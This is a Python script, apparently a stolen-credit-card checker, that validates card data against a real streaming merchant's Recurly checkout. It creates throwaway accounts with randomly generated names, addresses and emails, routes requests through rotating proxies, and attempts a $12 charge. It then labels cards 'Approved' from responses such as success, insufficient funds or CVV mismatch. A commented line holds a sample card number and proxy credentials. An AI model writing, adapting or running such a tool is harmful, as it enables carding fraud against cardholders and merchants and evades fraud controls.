
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json
import names
import platform
import AdyenEncrypt
import html
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"
async def RyukCHK(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout=15
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'application/json',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://services.streamisrael.tv/checkout',
                'Content-Type': 'application/json',
                'Origin': 'https://services.streamisrael.tv',
                'Connection': 'keep-alive',
                # 'Cookie': '_gcl_au=1.1.82424396.1676857748; _fbp=fb.1.1676857752471.1463849797',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            })
            CorreoRand = f"tapiaveny+{random.randint(1000,9999999)}@gmail.com"
            json_data = {
                'firstName': first,
                'lastName': last,
                'email': CorreoRand,
                'password': 'L4QtjcaeGNVN58a',
                'news': True,
            }
            async with session.post('https://services.streamisrael.tv/api/v1/subscribe/create-account', json=json_data,proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.json()
                    code = response['account']['code']
                    createdAt = response['account']['createdAt']
                    updatedAt = response['account']['updatedAt']
                    hostedLoginToken = response['account']['hostedLoginToken']
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-type': 'application/x-www-form-urlencoded',
                'Origin': 'https://api.recurly.com',
                'Connection': 'keep-alive',
                'Referer': 'https://api.recurly.com/js/v1/field.html',
            }
            data = f'first_name={first}&last_name={last}&address1={address}&city={City}&country=United%20States&state={State}&postal_code={Zip_Code}&number={ccnum}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fservices.streamisrael.tv%2Fcheckout&browser[screen_height]=1080&browser[screen_width]=1920&browser[time_zone_offset]=300&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A109.0%29%20Gecko%2F20100101%20Firefox%2F110.0&month={mes}&year={ano}&cvv={cvv}&version=4.22.8&key=ewr1-MetLt2zdPoqf0mwqiB4taf&deviceId=fh64HOTI8QlOKAmN&sessionId=7133h768x1le5tAW&instanceId=O65GXJ5acwqKTuYW'
            async with session.post('https://api.recurly.com/js/v1/token', headers=headers, data=data, timeout=15,  proxy=str(proxyrand)) as resp:
                try :  
                    response = await resp.json()
                    idrecurly = response['id']
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 

            json_data = {
                'tokenId': idrecurly,
                'code': code,
                'planCode': 'izzy-monthly',
                'currency': 'USD',
                'couponCode': '',
                'accountInfo': {
                    'id': 'sfhxwzysnkum',
                    'object': 'account',
                    'code': code,
                    'parentAccountId': None,
                    'billTo': 'self',
                    'state': 'active',
                    'username': None,
                    'email': CorreoRand,
                    'ccEmails': None,
                    'preferredLocale': None,
                    'firstName': first,
                    'lastName': last,
                    'company': None,
                    'vatNumber': None,
                    'taxExempt': False,
                    'exemptionCertificate': None,
                    'address': None,
                    'billingInfo': None,
                    'shippingAddresses': [],
                    'customFields': [
                        {
                            'name': 'marketing_option',
                            'value': '1',
                        },
                    ],
                    'hostedLoginToken': hostedLoginToken,
                    'hasLiveSubscription': False,
                    'hasActiveSubscription': False,
                    'hasFutureSubscription': False,
                    'hasCanceledSubscription': False,
                    'hasPausedSubscription': False,
                    'hasPastDueInvoice': False,
                    'createdAt': createdAt,
                    'updatedAt': updatedAt,
                    'deletedAt': None,
                    'dunningCampaignId': None,
                    'invoiceTemplateId': None,
                    'password': 'ad12e9236a0fada9f8009feb93b0047a',
                },
            }
            async with session.post('https://services.streamisrael.tv/api/v1/subscribe/purchase', json=json_data, proxy=str(proxyrand), timeout=15) as resp:
                try :
                    response = await resp.text()
                except (KeyError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️' 
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'

            if int(response.find('"status":"success"')) > 0 :
                await session.close()
                return "Approved","Charged (12$)"
            elif int(response.find('insufficient funds')) > 0 :
                jsonresponse = await resp.json()
                ErrorMessage = jsonresponse['purchase']['error']
                await session.close()
                return "Approved", ErrorMessage
            elif int(response.find('The security code you entered does not match')) > 0 :
                jsonresponse = await resp.json()
                ErrorMessage = jsonresponse['purchase']['error']
                await session.close()
                return "Approved", ErrorMessage
            elif int(response.find('Your billing address does not match the address on your account')) > 0 :
                jsonresponse = await resp.json()
                ErrorMessage = jsonresponse['purchase']['error']
                await session.close()
                return "Approved", ErrorMessage
            elif int(response.find('"error"')) > 0 :
                jsonresponse = await resp.json()
                ErrorMessage = jsonresponse['purchase']['error']
                await session.close()
                return ErrorMessage
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"

#print(asyncio.run(RyukCHK("4213166092262272|09|2022|816", "http://fctmbbxo-rotate:x4zj0j8n7k82@p.webshare.io:80/")))